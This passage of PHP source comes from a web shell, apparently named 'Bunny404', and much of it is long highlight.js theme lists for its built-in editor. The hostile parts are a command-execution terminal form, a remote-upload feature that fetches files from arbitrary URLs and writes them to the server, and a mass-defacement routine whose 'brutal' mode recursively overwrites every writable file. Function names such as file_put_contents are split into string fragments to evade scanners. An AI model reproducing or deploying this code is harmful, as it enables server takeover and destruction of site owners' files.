                <option>base16/harmonic16-light.min.css</option>
                <option>base16/heetch-dark.min.css</option>
                <option>base16/heetch-light.min.css</option>
                <option>base16/helios.min.css</option>
                <option>base16/hopscotch.min.css</option>
                <option>base16/horizon-dark.min.css</option>
                <option>base16/horizon-light.min.css</option>
                <option>base16/humanoid-dark.min.css</option>
                <option>base16/humanoid-light.min.css</option>
                <option>base16/ia-dark.min.css</option>
                <option>base16/ia-light.min.css</option>
                <option>base16/icy-dark.min.css</option>
                <option>base16/ir-black.min.css</option>
                <option>base16/isotope.min.css</option>
                <option>base16/kimber.min.css</option>
                <option>base16/london-tube.min.css</option>
                <option>base16/macintosh.min.css</option>
                <option>base16/marrakesh.min.css</option>
                <option>base16/materia.min.css</option>
                <option>base16/material-darker.min.css</option>
                <option>base16/material-lighter.min.css</option>
                <option>base16/material-palenight.min.css</option>
                <option>base16/material-vivid.min.css</option>
                <option>base16/material.min.css</option>
                <option>base16/mellow-purple.min.css</option>
                <option>base16/mexico-light.min.css</option>
                <option>base16/mocha.min.css</option>
                <option>base16/monokai.min.css</option>
                <option>base16/nebula.min.css</option>
                <option>base16/nord.min.css</option>
                <option>base16/nova.min.css</option>
                <option>base16/ocean.min.css</option>
                <option>base16/oceanicnext.min.css</option>
                <option>base16/one-light.min.css</option>
                <option>base16/onedark.min.css</option>
                <option>base16/outrun-dark.min.css</option>
                <option>base16/papercolor-dark.min.css</option>
                <option>base16/papercolor-light.min.css</option>
                <option>base16/paraiso.min.css</option>
                <option>base16/pasque.min.css</option>
                <option>base16/phd.min.css</option>
                <option>base16/pico.min.css</option>
                <option>base16/pop.min.css</option>
                <option>base16/porple.min.css</option>
                <option>base16/qualia.min.css</option>
                <option>base16/railscasts.min.css</option>
                <option>base16/rebecca.min.css</option>
                <option>base16/ros-pine-dawn.min.css</option>
                <option>base16/ros-pine-moon.min.css</option>
                <option>base16/ros-pine.min.css</option>
                <option>base16/sagelight.min.css</option>
                <option>base16/sandcastle.min.css</option>
                <option>base16/seti-ui.min.css</option>
                <option>base16/shapeshifter.min.css</option>
                <option>base16/silk-dark.min.css</option>
                <option>base16/silk-light.min.css</option>
                <option>base16/snazzy.min.css</option>
                <option>base16/solar-flare-light.min.css</option>
                <option>base16/solar-flare.min.css</option>
                <option>base16/solarized-dark.min.css</option>
                <option>base16/solarized-light.min.css</option>
                <option>base16/spacemacs.min.css</option>
                <option>base16/summercamp.min.css</option>
                <option>base16/summerfruit-dark.min.css</option>
                <option>base16/summerfruit-light.min.css</option>
                <option>base16/synth-midnight-terminal-dark.min.css</option>
                <option>base16/synth-midnight-terminal-light.min.css</option>
                <option>base16/tango.min.css</option>
                <option>base16/tender.min.css</option>
                <option>base16/tomorrow-night.min.css</option>
                <option>base16/tomorrow.min.css</option>
                <option>base16/twilight.min.css</option>
                <option>base16/unikitty-dark.min.css</option>
                <option>base16/unikitty-light.min.css</option>
                <option>base16/vulcan.min.css</option>
                <option>base16/windows-10-light.min.css</option>
                <option>base16/windows-10.min.css</option>
                <option>base16/windows-95-light.min.css</option>
                <option>base16/windows-95.min.css</option>
                <option>base16/windows-high-contrast-light.min.css</option>
                <option>base16/windows-high-contrast.min.css</option>
                <option>base16/windows-nt-light.min.css</option>
                <option>base16/windows-nt.min.css</option>
                <option>base16/woodland.min.css</option>
                <option>base16/xcode-dusk.min.css</option>
                <option>base16/zenburn.min.css</option>
            </select><br><br>
            <span>Font:</span>
            <select id="selectFont" class="bg-black">
                <option>Roboto Mono</option>
                <option>Consolas</option>
                <option>Cascadia Mono</option>
                <option>Inconsolata</option>
                <option>Source Code Pro</option>
                <option>IBM Plex Mono</option>
                <option>Space Mono</option>
                <option>PT Mono</option>
                <option>Ubuntu Mono</option>
                <option>Nanum Gothic Coding</option>
                <option>Cousine</option>
                <option>Fira Mono</option>
                <option>Share Tech Mono</option>
                <option>Courier Prime</option>
                <option>Anonymous Pro</option>
                <option>Cutive Mono</option>
                <option>VT323</option>
                <option>JetBrains Mono</option>
                <option>Noto Sans Mono</option>
                <option>Red Hat Mono</option>
                <option>Martian Mono</option>
                <option>Major Mono Display</option>
                <option>Nova Mono</option>
                <option>Syne Mono</option>
                <option>Xanh Mono</option>
                <option>Monofett</option>
            </select><br><br>
            <span>Font Size (pt):</span>
            <input id="inputFontSize" class="bg-black" type="number" step=".1" value="8" style="width: 70px;" /><br><br>
            <span>Language:</span>
            <select id="selectLanguage" class="bg-black">
                <option value="language-html">HTML</option>
                <option value="language-javascript">JavaScript</option>
                <option value="language-python">Python</option>
                <option value="language-java">Java</option>
                <option value="language-csharp">C#</option>
                <option value="language-php">PHP</option>
                <option value="language-cpp">C++</option>
                <option value="language-typescript">TypeScript</option>
                <option value="language-ruby">Ruby</option>
            </select><br><br>
            <div id="divCodeWrapper">
                <pre id="preCode"><code id="codeBlock" class="language-html"></code></pre>
                <textarea name="filecontent" class="placeholder:text-gray-500" id="textarea1" wrap="soft" spellcheck="false" placeholder="Bunny404 Was Here!!"></textarea>
            </div>
            <script type="text/javascript">
            const textarea1 = document.getElementById("textarea1");
            const codeBlock = document.getElementById("codeBlock");
            let content = textarea1.value;
            content = content.replace(/&/g, "&amp;");
            content = content.replace(/</g, "&lt;");
            content = content.replace(/>/g, "&gt;");
            codeBlock.innerHTML = content;
            highlightJS();
    
            function updateCode() {
                let content = textarea1.value;
                content = content.replace(/&/g, "&amp;");
                content = content.replace(/</g, "&lt;");
                content = content.replace(/>/g, "&gt;");
                codeBlock.innerHTML = content;
                highlightJS();
            }
    
            function highlightJS() {
                document.querySelectorAll("pre code").forEach((el) => {
                    hljs.highlightElement(el);
                });
            }
    
            textarea1.addEventListener("input", () => {
                updateCode();
            });
    
            textarea1.addEventListener("scroll", () => {
                codeBlock.scrollTop = textarea1.scrollTop;
                codeBlock.scrollLeft = textarea1.scrollLeft;
            });
    
            textarea1.addEventListener("keydown", function (e) {
                if (e.key === "Enter") {
                    e.preventDefault();
                    var cursorPos = textarea1.selectionStart;
                    var prevLine = textarea1.value.substring(0, cursorPos).split("\n").slice(-1)[0];
                    var indent = prevLine.match(/^\s*/)[0];
                    textarea1.setRangeText("\n" + indent, cursorPos, cursorPos, "end");
                    textarea1.blur();
                    textarea1.focus();
                    updateCode();
                    return;
                }
                if (e.key === "Tab" && !e.shiftKey &&
                    textarea1.selectionStart == textarea1.selectionEnd) {
                    e.preventDefault();
                    let cursorPosition = textarea1.selectionStart;
                    let newValue = textarea1.value.substring(0, cursorPosition) + "    " +
                        textarea1.value.substring(cursorPosition);
                    textarea1.value = newValue;
                    textarea1.selectionStart = cursorPosition + 4;
                    textarea1.selectionEnd = cursorPosition + 4;    
                    updateCode();
                    return;
                }
    
                if (e.key === "Tab" && e.shiftKey &&
    
                    textarea1.selectionStart == textarea1.selectionEnd) {
    
                    e.preventDefault();
    
                    let cursorPosition = textarea1.selectionStart;
                    let leadingSpaces = 0;
                    for (let i = 0; i < 4; i++) {
                        if (textarea1.value[cursorPosition - i - 1] === " ") {
                            leadingSpaces++;
                        } else {
                            break;
                        }
                    }
    
                    if (leadingSpaces > 0) {
                        let newValue = textarea1.value.substring(0, cursorPosition - leadingSpaces) +
                            textarea1.value.substring(cursorPosition);
                        textarea1.value = newValue;
                        textarea1.selectionStart = cursorPosition - leadingSpaces;
                        textarea1.selectionEnd = cursorPosition - leadingSpaces;
                    }
    
                    updateCode();
                    return;
                }
    
                if (e.key == "Tab" & textarea1.selectionStart != textarea1.selectionEnd) {
                    e.preventDefault();
                    let lines = this.value.split("\n");
    
                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
    
                    let spacesRemovedFirstLine = 0;
                    let spacesRemoved = 0;
    
                    if (e.shiftKey) {
                        for (let i = startPos; i <= endPos; i++) {
                            lines[i] = lines[i].replace(/^ {1,4}/, function (match) {
                                if (i == startPos)
                                    spacesRemovedFirstLine = match.length;
                                spacesRemoved += match.length;
    
                                return "";
                            });
                        }
                    } else {
                        for (let i = startPos; i <= endPos; i++) {
                            lines[i] = "    " + lines[i];
                        }
                    }
                    let start = this.selectionStart;
                    let end = this.selectionEnd;
                    this.value = lines.join("\n");
                    this.selectionStart = e.shiftKey ?
                        start - spacesRemovedFirstLine : start + 4;
                    this.selectionEnd = e.shiftKey ?
                        end - spacesRemoved : end + 4 * (endPos - startPos + 1); 
                    updateCode();
                    return;
                }
                if (e.shiftKey && (e.key === "Delete" || e.key === "Backspace")) {
    
                    e.preventDefault();
                    let startPos = this.value.substring(0, this.selectionStart).split("\n").length - 1;
                    let endPos = this.value.substring(0, this.selectionEnd).split("\n").length - 1;
                    let cursorLine = this.value.substring(0, this.selectionStart).split("\n").pop();
                    let cursorPosInLine = cursorLine.length;
                    let totalLinesRemove = endPos - startPos + 1;
                    let lines = this.value.split("\n");
                    let newStart = lines.slice(0, startPos).join("\n").length + (startPos > 0 ? 1 : 0);
                    lines.splice(startPos, totalLinesRemove);
                    let newLine = lines[startPos] || "";
                    if (newLine.length < cursorPosInLine) {
                        cursorPosInLine = newLine.length;
                    }
                    newStart += cursorPosInLine;
    
                    this.value = lines.join("\n");
                    this.selectionStart = this.selectionEnd = newStart; 
                    updateCode();
                    return;
                }
    
                if (e.key === "Home") {
                    let line = this.value.substring(0, this.selectionStart).split("\n").pop();
                    let cursorPosInLine = line.length;
                    let lineStartPos = this.value.substring(0, this.selectionStart).lastIndexOf("\n") + 1;
                    let firstNonWhitespacePos = line.search(/\S/);
                    if (firstNonWhitespacePos >= cursorPosInLine) {
                        return true;
                    }
                    else if (firstNonWhitespacePos === -1) {
                        return true;
                    }
                    e.preventDefault();
                    this.selectionStart = this.selectionEnd = lineStartPos + firstNonWhitespacePos;
                    return;
                }
            });
    
            document.getElementById("selectStyle").addEventListener("change", (e) => {
                document.getElementById("theme1").href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/${e.target.value}`;
            });
    
            function updateFont() {
                let selectFont = document.getElementById("selectFont");
                let fontName = selectFont.options[selectFont.selectedIndex].text;
                let fontNameUrl = fontName.replace(" ", "+");
                let inputFontSize = document.getElementById("inputFontSize");
                document.getElementById("style2").textContent = `
                @import url("https://fonts.googleapis.com/css2?&display=swap&family=${fontNameUrl}");
                pre, code, textarea {
                    font-family: "${fontName}", monospace !important;
                    font-size: ${inputFontSize.value}pt !important;
                }`;
            }
    
            document.getElementById("selectLanguage").addEventListener("change", function () {
                document.getElementById("codeBlock").className = this.value;
                highlightJS();
            });
    
            document.getElementById("inputFontSize").addEventListener("input", () => { updateFont(); });

            document.getElementById("selectFont").addEventListener("change", () => { updateFont(); });
            </script>
            ';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-newfiles" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Create</button>';
        echo '</form>';
    }

    if (isset($_GET['terminal'])) {
        echo '
        <form class="md:w-10/12 w-full mt-4 mx-2 mb-12 pb-12" style="height: 70vh;" action="" method="POST">
            <div class="flex">
                <span class="inline-flex text-white fs-xl">$</span>
                <input type="text" id="BunnyBoy" name="BunnyBoy" class="BunnyBoy ubuntu-mono mb-1 w-full h-10 bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none" value="' . $_POST['BunnyBoy'] . '">
            </div>
            <textarea name="BunnyCmd" id="BunnyCmd" readonly class="BunnyCmd ubuntu-mono px-4 py-2 mt-1 w-full h-full bg-black rounded border-none hover:border-none focus:border-none outline-none hover:outline-none focus:outline-none ' . $txtEmerald . '">' . BunnyCmd(trim(htmlspecialchars(stripslashes($_POST['BunnyBoy'])))) . '</textarea>
        </form>
        ';
    }

    if (isset($_GET['remoteupload'])) {
        if (isset($_POST['btn-remote'])) {
            $SiBunny = 'h' . 'tm' . 'ls' . 'pe' . 'cial' . 'ch' . 'ars';
            $b_name = 'b' . 'as' . 'en' . 'am' . 'e';
            $f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
            $f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
            $fo = "fop" . "en";
            $fw = "fw" . "r" . "it" . "e";
            $fc = 'fc' . 'lo' . 's' . 'e';
            $this_file = $_POST['remoteup'];
            $f_content = $f_get($this_file);
            $this_file_name = $_POST['remotefname'];
            if ($content !== false) {
                $writeF = $f_put($this_file_name, $f_content);
                if ($writeF !== false) {
                    echo '<script>
                    alert("Remote File Success :(")
                    </script>';
                } else {
                    echo '<script>
                    alert("Remote File Failed :(")
                    </script>';
                }
            } else {
                echo '<script>
                    alert("Remote File Failed :(")
                    </script>';
            }
        }
        echo '<form class="mx-2 my-2" action="" method="POST">';
        echo '<label class="block w-3/6 ml-2 flex flex-col flex-wrap">
            <span class="block">Remote Upload Via Url</span>
            <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-full border border-slate-300 rounded-md mb-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remoteup" placeholder="https://bunny404.fbi.gov">
            <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 border border-slate-300 rounded-md mt-2 py-2 pl-4 shadow-sm placeholder:text-gray-600" name="remotefname" placeholder="saved.txt">
            </label>';
        echo '<button type="button" onclick="history.back()" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-pink-700 rounded-lg focus:ring-4 focus:ring-pink-200 dark:focus:ring-pink-900 hover:bg-pink-800">Back</button>';
        echo '<button type="submit" name="btn-remote" class="inline-flex items-center mt-2 mx-2 px-5 py-2.5 text-sm font-medium text-center text-white bg-blue-700 rounded-lg focus:ring-4 focus:ring-blue-200 dark:focus:ring-blue-900 hover:bg-blue-800">Save File</button>';
        echo '</form>';
    }

    if (isset($_GET['Gass_Terus'])) {
        $f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
        $is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
        $is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
        $is_d = 'is' . '_' . 'd' . 'i' . 'r';
        $is_f = 'is' . '_' . 'f' . 'i' . 'l' . 'e';
        $scn_d = 'sc' . 'an' . 'd' . 'ir';
        $glb = 'g' . 'l' . 'o' . 'b';
        function mass_normal($path, $gasterusfilename, $gasterusfilcontent)
        {
            global $f_put;
            global $is_w;
            global $is_r;
            global $is_d;
            global $scn_d;
            global $txtWhite;
            global $txtEmerald;
            global $txtGreen;
            global $txtYellow;
            if ($is_w) {
                $scan = $scn_d($path);
                foreach ($scan as $dir) {
                    $this_dir = "$path/$dir";
                    $this_files = "$this_dir/$gasterusfilename";
                    $gtfiles = str_replace('\\', '/', $this_files);
                    if ($dir === '.') {
                        $f_put($gtfiles, $gasterusfilcontent);
                    } elseif ($dir === '..') {
                        $f_put($gtfiles, $gasterusfilcontent);
                    } else {
                        if ($is_d($this_dir)) {
                            if ($is_w($this_dir)) {
                                echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $gtfiles . ' (<font class="' . $txtGreen . ' font-bold">TERKEDJOET!!</font>)<br>';
                                echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $path . '/' . $gasterusfilename . ' (<font class="' . $txtGreen . ' font-bold">TERKEDJOET!!</font>)<br>';
                                $f_put($gtfiles, $gasterusfilcontent);
                            }
                        }
                    }
                }
            } else {
                echo '<span class="' . $txtYellow . '">Sorry... Your Selected Path Not Writetable!</span>';
            }
        }
        function mass_brutal($path, $gasterusfilcontent)
        {
            global $f_put;
            global $is_w;
            global $is_r;
            global $is_d;
            global $scn_d;
            global $glb;
            global $txtWhite;
            global $txtRed;
            global $txtGreen;
            global $txtYellow;
            global $txtEmerald;
            if ($is_w) {
                $scan = $scn_d($path);
                foreach ($scan as $dir) {
                    $this_dir = "$path/$dir";
                    $getallfile = $glb($path . '*', GLOB_MARK);
                    foreach ($getallfile as $gasterusfilename) {
                        $gtfiles = str_replace('\\', '/', $gasterusfilename);
                        if ($dir === '.') {
                            $f_put($gtfiles, $gasterusfilcontent);
                        } elseif ($dir === '..') {
                            $f_put($gtfiles, $gasterusfilcontent);
                        } else {
                            if ($is_d($this_dir)) {
                                if ($is_w($this_dir)) {
                                    echo '<span class="' . $txtWhite . ' ml-4">[<i class="fa-solid fa-check-double ' . $txtGreen . '"></i>]</span>&nbsp;' . $gtfiles . ' (<font class="' . $txtGreen . ' font-bold">TERKEDJOET!!</font>)<br>';
                                    $f_put($gtfiles, $gasterusfilcontent);
                                    mass_brutal($gtfiles, $gasterusfilcontent);
                                }
                            }
                        }
                    }
                }
            } else {
                echo '<span class="' . $txtYellow . '">Sorry... Your Selected Path Not Writetable!</span>';
            }
        }
        if (isset($_POST['btn-normal-mode'])) {
            $gtpatch = $_POST['gasteruspath'];
            $gtfilesname = $_POST['gasterusfile'];
            $gtfilescontent = $_POST['gasterusfilecontent'];
            mass_normal($gtpatch, $gtfilesname, $gtfilescontent);
        }

        if (isset($_POST['btn-brutal-mode'])) {
            $gtpatch = $_POST['gasteruspath'];
            $gtfilescontent = $_POST['gasterusfilecontent'];
            mass_brutal($gtpatch, $gtfilescontent);
        }
        echo '
        <form method="POST" action="" class="max-w-sm ml-4 mt-6">
            <label for="mode" class="block mb-2 text-sm font-medium ' . $txtBlue . '">Change Mode</label>
            <select id="mode" name="mode" onchange="this.form.submit()" class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500">
                <option>Select Mode</option>
                <option value="normal">NORMAL MODE</option>
                <option value="brutal">BRUTAL MODE</option>
            </select>
        </form>';
        if ($_SERVER["REQUEST_METHOD"] === "POST") {
            $mode = $_POST['mode'];
            $normal = 'normal';
            $brutal = 'brutal';
            if ($mode == $normal) {
                echo '<form class="ml-4 my-2" action="" method="POST">';
                echo '<span class="block ' . $txtYellow . ' font-medium">' . strtoupper($mode) . '<font class="' . $txtBlue . '">&nbsp;&nbsp;Mode Selected!</font></span>';
                echo '<label class="block">
            <span class="block ' . $txtBlue . ' font-medium">Path <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
            <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold md:w-2/4 w-full border border-slate-300 rounded-md py-2 pl-4 shadow-sm" value="' . $path . '" name="gasteruspath">
            </label>';
                echo '<label class="block">
            <span class="block ' . $txtBlue . ' font-medium">Filename <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
            <input type="text" class="bg-white ' . $txtBlack . ' tracking-wider font-bold w-auto border border-slate-300 rounded-md py-2 pl-4 placeholder:text-gray-600 shadow-sm" placeholder="index.php" name="gasterusfile">
            </label>';
                echo '
            <style type="text/css">
            @import url("https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap");
    
            #divCodeWrapper {
                height: 80vh;
                width: 100%;
                overflow: hidden;
                border: 1px solid #a5a5a5;
                position: relative;
            }
    
            #preCode {
                height: 100%;
                width: 100%;
                position: absolute;
                top: 0;
                left: 0;
                overflow: hidden;
                padding: 0;
                margin: 0;
                background: #1b1b1b;
            }
    
                #preCode code {
                    padding: 15px;
                    height: calc(100% - 30px);
                    width: calc(100% - 30px);
                    font-family: "Roboto Mono", monospace;
                    font-weight: 400;
                    font-size: 12pt;
                    line-height: 150%;
                    overflow-y: scroll;
                    overflow-x: auto;
                }
    
            textarea {
                font-family: "Roboto Mono", monospace;
                font-weight: 400;
                font-size: 12pt;
                line-height: 150%;
                position: absolute;
                top: 0;
                left: 0;
                height: calc(100% - 30px);
                width: calc(100% - 30px);
                padding: 15px;
                z-index: 2;
                overflow-x: auto;
                overflow-y: scroll;
                white-space: nowrap;
                background-color: rgba(0,0,0,0);
                color: rgba(0,0,0,0);
                caret-color: white;
            }
        </style>
        <span class="block ' . $txtBlue . ' font-medium">Filecontent <i class="fa-solid fa-arrow-down ' . $txtWhite . '"></i></span>
        <span>Theme:</span>
            <select id="selectStyle" class="bg-black">
                <option>a11y-dark.min.css</option>
                <option>a11y-light.min.css</option>
                <option>agate.min.css</option>
                <option>an-old-hope.min.css</option>
                <option>androidstudio.min.css</option>
                <option>arduino-light.min.css</option>
                <option>arta.min.css</option>
                <option>ascetic.min.css</option>
                <option>atom-one-dark-reasonable.min.css</option>
                <option>atom-one-dark.min.css</option>
                <option>atom-one-light.min.css</option>
                <option>brown-paper.min.css</option>
                <option>codepen-embed.min.css</option>
                <option>color-brewer.min.css</option>
                <option>dark.min.css</option>
                <option>default.min.css</option>
                <option>devibeans.min.css</option>
                <option>docco.min.css</option>
                <option>far.min.css</option>
                <option>felipec.min.css</option>
                <option>foundation.min.css</option>
                <option>github-dark-dimmed.min.css</option>
                <option>github-dark.min.css</option>
                <option>github.min.css</option>
                <option>gml.min.css</option>
                <option>googlecode.min.css</option>
                <option>gradient-dark.min.css</option>
                <option>gradient-light.min.css</option>
                <option>grayscale.min.css</option>
                <option>hybrid.min.css</option>
                <option>idea.min.css</option>
                <option>intellij-light.min.css</option>
                <option>ir-black.min.css</option>
                <option>isbl-editor-dark.min.css</option>
                <option>isbl-editor-light.min.css</option>
                <option>kimbie-dark.min.css</option>
                <option>kimbie-light.min.css</option>
                <option>lightfair.min.css</option>
                <option>lioshi.min.css</option>
                <option>magula.min.css</option>
                <option>mono-blue.min.css</option>
                <option>monokai-sublime.min.css</option>
                <option>monokai.min.css</option>
                <option>night-owl.min.css</option>
                <option>nnfx-dark.min.css</option>
                <option>nnfx-light.min.css</option>
                <option>nord.min.css</option>
                <option>obsidian.min.css</option>
                <option>panda-syntax-dark.min.css</option>
                <option>panda-syntax-light.min.css</option>
                <option>paraiso-dark.min.css</option>
                <option>paraiso-light.min.css</option>
                <option>pojoaque.min.css</option>
                <option>purebasic.min.css</option>
                <option>qtcreator-dark.min.css</option>
                <option>qtcreator-light.min.css</option>
                <option>rainbow.min.css</option>
                <option>routeros.min.css</option>
                <option>school-book.min.css</option>
                <option>shades-of-purple.min.css</option>
                <option>srcery.min.css</option>
                <option>stackoverflow-dark.min.css</option>
                <option>stackoverflow-light.min.css</option>
                <option>sunburst.min.css</option>
                <option>tokyo-night-dark.min.css</option>
                <option>tokyo-night-light.min.css</option>
                <option>tomorrow-night-blue.min.css</option>
                <option>tomorrow-night-bright.min.css</option>
                <option>vs.min.css</option>
                <option selected>vs2015.min.css</option>
                <option>xcode.min.css</option>
                <option>xt256.min.css</option>
                <option>base16/3024.min.css</option>
                <option>base16/apathy.min.css</option>
                <option>base16/apprentice.min.css</option>
                <option>base16/ashes.min.css</option>
                <option>base16/atelier-cave-light.min.css</option>
                <option>base16/atelier-cave.min.css</option>
                <option>base16/atelier-dune-light.min.css</option>
                <option>base16/atelier-dune.min.css</option>
                <option>base16/atelier-estuary-light.min.css</option>
                <option>base16/atelier-estuary.min.css</option>
                <option>base16/atelier-forest-light.min.css</option>
                <option>base16/atelier-forest.min.css</option>
                <option>base16/atelier-heath-light.min.css</option>
                <option>base16/atelier-heath.min.css</option>
                <option>base16/atelier-lakeside-light.min.css</option>
                <option>base16/atelier-lakeside.min.css</option>
                <option>base16/atelier-plateau-light.min.css</option>
                <option>base16/atelier-plateau.min.css</option>
                <option>base16/atelier-savanna-light.min.css</option>
                <option>base16/atelier-savanna.min.css</option>
                <option>base16/atelier-seaside-light.min.css</option>
                <option>base16/atelier-seaside.min.css</option>
                <option>base16/atelier-sulphurpool-light.min.css</option>
                <option>base16/atelier-sulphurpool.min.css</option>
                <option>base16/atlas.min.css</option>
                <option>base16/bespin.min.css</option>
                <option>base16/black-metal-bathory.min.css</option>
                <option>base16/black-metal-burzum.min.css</option>
                <option>base16/black-metal-dark-funeral.min.css</option>
                <option>base16/black-metal-gorgoroth.min.css</option>
                <option>base16/black-metal-immortal.min.css</option>
                <option>base16/black-metal-khold.min.css</option>
                <option>base16/black-metal-marduk.min.css</option>
                <option>base16/black-metal-mayhem.min.css</option>
                <option>base16/black-metal-nile.min.css</option>
                <option>base16/black-metal-venom.min.css</option>
                <option>base16/black-metal.min.css</option>
                <option>base16/brewer.min.css</option>
                <option>base16/bright.min.css</option>
                <option>base16/brogrammer.min.css</option>
                <option>base16/brush-trees-dark.min.css</option>
                <option>base16/brush-trees.min.css</option>
                <option>base16/chalk.min.css</option>
                <option>base16/circus.min.css</option>
                <option>base16/classic-dark.min.css</option>
                <option>base16/classic-light.min.css</option>
                <option>base16/codeschool.min.css</option>
                <option>base16/colors.min.css</option>
                <option>base16/cupcake.min.css</option>
                <option>base16/cupertino.min.css</option>
                <option>base16/danqing.min.css</option>
                <option>base16/darcula.min.css</option>
                <option>base16/dark-violet.min.css</option>
                <option>base16/darkmoss.min.css</option>
                <option>base16/darktooth.min.css</option>
                <option>base16/decaf.min.css</option>
                <option>base16/default-dark.min.css</option>
                <option>base16/default-light.min.css</option>
                <option>base16/dirtysea.min.css</option>
                <option>base16/dracula.min.css</option>
                <option>base16/edge-dark.min.css</option>
                <option>base16/edge-light.min.css</option>
                <option>base16/eighties.min.css</option>
                <option>base16/embers.min.css</option>
                <option>base16/equilibrium-dark.min.css</option>
                <option>base16/equilibrium-gray-dark.min.css</option>
                <option>base16/equilibrium-gray-light.min.css</option>
                <option>base16/equilibrium-light.min.css</option>
                <option>base16/espresso.min.css</option>
                <option>base16/eva-dim.min.css</option>
                <option>base16/eva.min.css</option>
                <option>base16/flat.min.css</option>
                <option>base16/framer.min.css</option>
                <option>base16/fruit-soda.min.css</option>
                <option>base16/gigavolt.min.css</option>
                <option>base16/github.min.css</option>
                <option>base16/google-dark.min.css</option>
                <option>base16/google-light.min.css</option>
                <option>base16/grayscale-dark.min.css</option>
                <option>base16/grayscale-light.min.css</option>
                <option>base16/green-screen.min.css</option>
                <option>base16/gruvbox-dark-hard.min.css</option>
                <option>base16/gruvbox-dark-medium.min.css</option>
                <option>base16/gruvbox-dark-pale.min.css</option>
                <option>base16/gruvbox-dark-soft.min.css</option>
                <option>base16/gruvbox-light-hard.min.css</option>
                <option>base16/gruvbox-light-medium.min.css</option>
                <option>base16/gruvbox-light-soft.min.css</option>
                <option>base16/hardcore.min.css</option>
                <option>base16/harmonic16-dark.min.css</option>
                <option>base16/harmonic16-light.min.css</option>
                <option>base16/heetch-dark.min.css</option>
                <option>base16/heetch-light.min.css</option>
                <option>base16/helios.min.css</option>
                <option>base16/hopscotch.min.css</option>
                <option>base16/horizon-dark.min.css</option>
                <option>base16/horizon-light.min.css</option>
                <option>base16/humanoid-dark.min.css</option>
                <option>base16/humanoid-light.min.css</option>
                <option>base16/ia-dark.min.css</option>
                <option>base16/ia-light.min.css</option>
                <option>base16/icy-dark.min.css</option>
                <option>base16/ir-black.min.css</option>
                <option>base16/isotope.min.css</option>
                <option>base16/kimber.min.css</option>
                <option>base16/london-tube.min.css</option>
                <option>base16/macintosh.min.css</option>
                <option>base16/marrakesh.min.css</option>
                <option>base16/materia.min.css</option>
                <option>base16/material-darker.min.css</option>
                <option>base16/material-lighter.min.css</option>
                <option>base16/material-palenight.min.css</option>
                <option>base16/material-vivid.min.css</option>
                <option>base16/material.min.css</option>
                <option>base16/mellow-purple.min.css</option>
                <option>base16/mexico-light.min.css</option>
                <option>base16/mocha.min.css</option>
                <option>base16/monokai.min.css</option>
                <option>base16/nebula.min.css</option>
                <option>base16/nord.min.css</option>
                <option>base16/nova.min.css</option>
                <option>base16/ocean.min.css</option>
                <option>base16/oceanicnext.min.css</option>
                <option>base16/one-light.min.css</option>
                <option>base16/onedark.min.css</option>
                <option>base16/outrun-dark.min.css</option>
                <option>base16/papercolor-dark.min.css</option>
                <option>base16/papercolor-light.min.css</option>
                <option>base16/paraiso.min.css</option>
                <option>base16/pasque.min.css</option>
                <option>base16/phd.min.css</option>
                <option>base16/pico.min.css</option>
                <option>base16/pop.min.css</option>
                <option>base16/porple.min.css</option>
                <option>base16/qualia.min.css</option>
                <option>base16/railscasts.min.css</option>
                <option>base16/rebecca.min.css</option>
                <option>base16/ros-pine-dawn.min.css</option>
                <option>base16/ros-pine-moon.min.css</option>
                <option>base16/ros-pine.min.css</option>
                <option>base16/sagelight.min.css</option>
                <option>base16/sandcastle.min.css</option>
                <option>base16/seti-ui.min.css</option>
                <option>base16/shapeshifter.min.css</option>
                <option>base16/silk-dark.min.css</option>
                <option>base16/silk-light.min.css</option>
                <option>base16/snazzy.min.css</option>
                <option>base16/solar-flare-light.min.css</option>
                <option>base16/solar-flare.min.css</option>
                <option>base16/solarized-dark.min.css</option>
                <option>base16/solarized-light.min.css</option>
                <option>base16/spacemacs.min.css</option>
                <option>base16/summercamp.min.css</option>
                <option>base16/summerfruit-dark.min.css</option>
                <option>base16/summerfruit-light.min.css</option>
                <option>base16/synth-midnight-terminal-dark.min.css</option>
                <option>base16/synth-midnight-terminal-light.min.css</option>
                <option>base16/tango.min.css</option>
                <option>base16/tender.min.css</option>
                <option>base16/tomorrow-night.min.css</option>
                <option>base16/tomorrow.min.css</option>
